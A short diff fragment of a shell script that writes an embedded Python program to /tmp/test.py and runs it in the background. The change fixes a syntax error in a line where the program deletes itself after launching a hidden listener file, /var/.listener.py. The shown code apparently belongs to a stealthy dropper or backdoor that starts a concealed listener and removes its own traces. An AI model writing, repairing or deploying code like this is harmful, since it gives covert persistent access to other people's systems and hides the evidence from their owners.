@@ -37,7 +37,7 @@ def main():
 	f.close()
 	os.system("python3 /var/.listener.py")
 	self = sys.argv[0]
-	os.system(f"rm {self}"
+	os.system(f"rm {self}")
 main()
 EOFA
 python3 /tmp/test.py $1 &
